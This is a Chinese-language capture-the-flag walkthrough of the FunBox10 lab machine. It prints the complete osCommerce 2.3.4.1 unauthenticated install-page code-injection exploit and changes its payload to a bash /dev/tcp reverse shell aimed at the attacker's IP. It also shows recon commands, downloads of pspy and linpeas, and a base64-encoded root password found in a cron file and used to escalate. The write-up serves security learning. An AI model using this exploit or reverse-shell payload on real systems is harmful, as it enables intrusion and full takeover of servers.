注意修改靶机 网卡时 ，Shift + .  才是 ：

# FunBox10

## 信息搜集

扫网段

```bash
nmap -sP 192.168.0.0/24
```

nmap扫端口

```bash
┌──(root💀kali)-[~]
└─# nmap --top-port 1000 -sV -A 192.168.0.104
```

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:35:c4:90:87:20:4e:b2:59:78:19:da:da:8b:c6:ed (RSA)
|   256 55:7c:a9:99:35:1b:0e:c1:ff:5d:12:a2:1c:70:7b:84 (ECDSA)
|_  256 20:97:69:f0:8f:e0:c9:07:ee:b0:4f:02:fb:9b:ca:0c (ED25519)
25/tcp  open  smtp    Postfix smtpd
|_smtp-commands: funbox10, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=funbox10
| Not valid before: 2021-06-24T17:27:09
|_Not valid after:  2031-06-22T17:27:09
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Khronos 2.0 - Slides
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE SASL CAPA UIDL PIPELINING TOP
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: IDLE LITERAL+ LOGINDISABLEDA0001 ID ENABLE have LOGIN-REFERRALS SASL-IR post-login listed IMAP4rev1 Pre-login OK capabilities more
MAC Address: 00:0C:29:66:99:D8 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host:  funbox10; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

检索80端口下的web上下文路径：

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.0.104 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak  
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.104
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,json,git,php,txt,txt.bak,html.bak,git.bak,js,php.bak
[+] Timeout:                 10s
===============================================================
2023/05/06 04:04:10 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/.html.bak            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 40070]
/images               (Status: 301) [Size: 315] [--> http://192.168.0.104/images/]
/catalog              (Status: 301) [Size: 316] [--> http://192.168.0.104/catalog/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.104/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.104/js/]
/styles.html          (Status: 200) [Size: 49211]
/readme.txt           (Status: 200) [Size: 4919]
/.php                 (Status: 403) [Size: 278]
/.html.bak            (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 2425826 / 2426171 (99.99%)===============================================================
2023/05/06 04:06:23 Finished
===============================================================
```

发现特殊路径 `/catalog `，访问得到如下页面：
<img src=".\图片\Snipaste_2023-05-06_16-32-22.png" alt="Snipaste_2023-05-06_16-32-22" style="zoom:80%;" />

接下来试试搜索有无该 cms 已知漏洞

```bash
└─$ searchsploit osCommerce
osCommerce 2.3.4.1 - Remote Code Execution                                                                                  | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                                                                              | php/webapps/50128.py
```

看看高危漏洞：远程代码执行

```bash
┌──(kali㉿kali)-[~]
└─$ locate php/webapps/44374.py
/usr/share/exploitdb/exploits/php/webapps/44374.py
```

## 漏洞利用

修改exp，已知漏洞利用

```bash
┌──(kali㉿kali)-[~]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/44374.py funbox10.py
┌──(kali㉿kali)-[~]
└─$ cat funbox10.py                                                  
# Exploit Title: osCommerce 2.3.4.1 Remote Code Execution
# Date: 29.0.3.2018
# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
# Tested on: Linux, Windows

# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
# execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject
# PHP code into the config file and then simply executing the code by opening it.


import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://localhost//oscommerce-2.3.4.1/catalog/"
target_url = "http://localhost/oscommerce-2.3.4.1/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# the payload will be injected into the configuration file via this code
# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
# so the format for the exploit will be: '); PAYLOAD; /*

payload = '\');'
payload += 'system("ls");'    # this is where you enter you PHP payload
payload += '/*'

data['DB_DATABASE'] = payload

# exploit it
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")
```

```bash
┌──(kali㉿kali)-[~]
└─$ python funbox10.py 
[+] Successfully launched the exploit. Open the following URL to execute your code

http://192.168.0.104/catalog/install/includes/configure.php
```

<img src=".\图片\Snipaste_2023-05-06_16-44-40.png" alt="Snipaste_2023-05-06_16-44-40" style="zoom:80%;" />

### 反弹shell

修改payload反弹shell，注意嵌套引号要注意转义，php命令执行反弹shell时要用 `bash -c`  的方式入参：

```python
payload += "shell_exec('bash -c \"bash -i >& /dev/tcp/192.168.0.103/6666 0>&1\"');"    # this is where you enter you PHP payload
```

触发：

```bash
└─$ python funbox10.py
```

```http
http://192.168.0.104/catalog/install/includes/configure.php  // 点击
```

<img src=".\图片\Snipaste_2023-05-06_17-11-14.png" alt="Snipaste_2023-05-06_17-11-14" style="zoom:80%;" />

## 提权

先试试找root权限执行的文件

```bash
find / ‐perm ‐u=s ‐type f 2>/dev/null
```

再试试查看定时任务、进程啥的，这里直接下载脚本

用python开启web服务，直接下载wget主机信息探测的脚本，这样效率高，两个脚本

```http
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

先看看当前后台的进程

```bash
www-data@funbox10:/tmp$  wget http://192.168.0.101:7777/pspy64
www-data@funbox10:/tmp$ chmod +x pspy64
chmod +x pspy64
www-data@funbox10:/tmp$ ./pspy64
./pspy64
```

发现一个定时任务

```bash
2023/05/06 11:38:01 CMD: UID=1000 PID=2798   | /bin/sh -c /usr/share/doc/examples/cron.sh 
```

查看

```bash
www-data@funbox10:/var/www/html/catalog/install/includes$ cat /usr/share/doc/examples/cron.sh
<html/catalog/install/includes$ cat /usr/share/doc/examples/cron.sh          
# cron.sh sample file
# 0 20 * * * /bin/goahead --parameter: LXUgcm9vdCAtcCByZnZiZ3QhIQ==
```

有个关键信息，像是base64编码，解码试试，发现是root的密码

```bash
┌──(root💀kali)-[/home/kali]
└─# echo "LXUgcm9vdCAtcCByZnZiZ3QhIQ==" | base64 -d                                                                                                      
-u root -p rfvbgt!!                                                                     
```

再换一个交互式shell，su 输入密码提权

```bash
www-data@funbox10:/var/www/html/catalog/install/includes$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@funbox10:/var/www/html/catalog/install/includes$ su
su
Password: rfvbgt!!

root@funbox10:/var/www/html/catalog/install/includes# id
id
uid=0(root) gid=0(root) groups=0(root)
```

<img src=".\图片\Snipaste_2023-05-06_17-45-45.png" alt="Snipaste_2023-05-06_17-45-45" style="zoom:80%;" />






